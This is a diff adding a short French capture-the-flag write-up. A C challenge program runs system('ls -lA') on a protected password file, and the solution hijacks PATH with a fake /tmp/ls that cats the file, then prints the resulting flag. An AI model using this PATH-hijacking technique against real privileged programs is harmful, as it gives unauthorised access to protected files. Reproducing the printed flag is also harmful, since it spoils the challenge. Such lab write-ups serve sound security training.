@@ -1,0 +1,32 @@
+[ENONCE]
+
+code source
+--------------------------------------------------------------------------------
+    #include <stdlib.h>
+    #include <stdio.h>
+     
+    int main(){
+    	system("ls -lA /challenge/app-script/ch12/.passwd");
+    	return 0;
+    }
+--------------------------------------------------------------------------------
+
+
+[SOLUTION]
+
+La seule difficulté étant ce -lA , il suffit de ne pas le prendre en compte :
+
+    binary2@wargame01:~$ nano /tmp/ls
+
+Dans ce fichier, on écrit
+
+    cat $2
+
+Enregistrer, puis :
+
+    binary2@wargame01:~$ PATH=/tmp:$PATH
+
+En exécutant ./binary2, on obtiens le flag :
+
+    binary2@challenge02:~$ ./binary2
+    8a95eDS/*e_T#
